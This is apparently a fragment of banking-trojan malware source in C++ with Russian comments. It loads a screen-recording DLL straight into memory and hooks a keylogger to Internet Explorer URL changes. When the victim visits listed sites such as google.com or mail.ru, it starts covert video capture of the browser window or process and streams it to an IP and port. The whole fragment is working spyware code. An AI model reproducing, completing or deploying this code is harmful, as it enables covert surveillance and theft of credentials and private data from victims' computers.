HMEMORYMODULE	hLibWndRec = NULL;

//StartRecHwnd( char* uid, char* nameVideo, HWND wnd, const char* ip, int port ) //запись по HWND окна
//StartRecPid( char* uid, DWOD pid, char* ip, int port )  //запись по PID процесса
typedef VOID (WINAPI *TStartRecHwnd) ( char* uid, char* nameVideo, HWND wnd , const char* ip, int port) ;
typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip, int port ) ;
typedef VOID (WINAPI *TStopRec) ();

char CurrentChar[256];

void StartRecordThread(DWORD pid,PCHAR KeyWord,PCHAR ip, int port)//стартуем поток записи видео
{

	if (!hLibWndRec)
		hLibWndRec = MemoryLoadLibrary(WndRec);
	else
		return;
	if (hLibWndRec)
	{

		TStartRecPid pStartRecPid;
	pOutputDebugStringA("MemoryGetProcAddress");
		pStartRecPid =(TStartRecPid) MemoryGetProcAddress(hLibWndRec,"StartRecPid");
		if (pStartRecPid)
		{
			char Buf[100];
			GenerateUid(Buf);
			pOutputDebugStringA("pStartRecPid");
			pStartRecPid(Buf,KeyWord,pid,ip,port);
		};
	};
}


void StartRecordThread(HWND hWnd,PCHAR KeyWord,PCHAR ip, int port)//стартуем поток записи видео
{
	if (!hLibWndRec)
		hLibWndRec = MemoryLoadLibrary(WndRec);
	else
		return;
	if (hLibWndRec)
	{

		TStartRecHwnd pStartRecHwnd;

		pStartRecHwnd = (TStartRecHwnd)MemoryGetProcAddress(hLibWndRec,"StartRecHwnd");
		if (pStartRecHwnd)
		{
			char Buf[100];
			GenerateUid(Buf);
			pStartRecHwnd(Buf,KeyWord,hWnd,ip,port);
		};
	};
}


void StopRecordThread()//останавливаем поток записи видео
{
	
	if (hLibWndRec)
	{pOutputDebugStringA("hLibWndRec<>NULL");
		TStopRec pStopRec;
		pStopRec = (TStopRec) MemoryGetProcAddress(hLibWndRec,"StopRec");
		if (pStopRec)
		{
			char Buf[100];
			GenerateUid(Buf);
			pStopRec();
			
			pOutputDebugStringA("pStopRec");
		};
	
	//MemoryFreeLibrary(hLibWndRec);
	pOutputDebugStringA("NUHOOK");
	hLibWndRec = NULL;
	};
}
/// список отлавливаемых урлов
char dat[][100] = {"*google.com*", "*mail.ru*", "str3","|"};


void WINAPI IEURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
{
	bool Flag=false;
	int i=0;	
	while(plstrcmpA(dat[i],"|"))
	{
		pOutputDebugStringA(dat[i]);
		if (CompareUrl( dat[i], (char*) Data ))
		{
			Flag=true;
			break;
		}
		i++;
	}
	if (Flag)
	{
		/*if(plstrcmpA(dat[i],CurrentChar))
		{*/
			StartRecordThread(GetUniquePID(),&dat[i][0],"127.0.0.1",700);

		/*}
		else
		{
			StopRecordThread();		
			m_lstrcpy(CurrentChar,&dat[i][0]);
			StartRecordThread(GetUniquePID(),&dat[i][0],"127.0.0.1",700);
			pOutputDebugStringA("Start");
			pOutputDebugStringA((PCHAR)Data);		
		}*/
	}
	else
	{
		StopRecordThread();
		pOutputDebugStringA("Stop");
	}
}


void StartVideoFromCurrentURL()
{
	#ifdef UniversalKeyLoggerH
		KeyLogger::Initialize();
		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, IEURLChanged);
		KeyLogger::Start();
	#endif
}